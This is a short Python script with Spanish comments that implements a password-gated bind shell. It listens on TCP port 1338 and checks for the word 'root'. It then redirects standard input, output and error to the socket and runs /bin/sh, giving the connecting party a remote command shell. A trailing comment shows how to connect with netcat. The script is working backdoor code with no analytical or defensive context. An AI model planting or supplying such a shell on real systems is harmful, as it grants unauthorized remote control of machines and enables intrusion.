#--*-- coding:UTF-8 --*--
import socket, os, code, sys

host = ''
port = 1338
palabra = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind( (host, port) )
s.listen(1)
client, direction = s.accept()

print(direction)
print(client.getpeername())

client.send("Hola caracola\n")
response = client.recv(1024)
print(response)

while 1:
    if response == "root\n":
        print("root")
        for f in range(3):
            os.dup2(client.fileno(), f) # La f sera de 0 a 2, y en la funcion dup le redirige a el socket client el canal 0 (Teclado), canal 1 (Pantalla), canal 3(Salida de error) en linux 
        os.execl("/bin/sh", "/bin/sh") # ejecutar bash
        code.interact() # Permite la interaccion entre el cliente y el servidor
        sys.exit()
    else:
        print("salimos")
        break
        
client.close()
s.close()


# para conectarse --> nc -vv (IP)192.168.1.12 1338 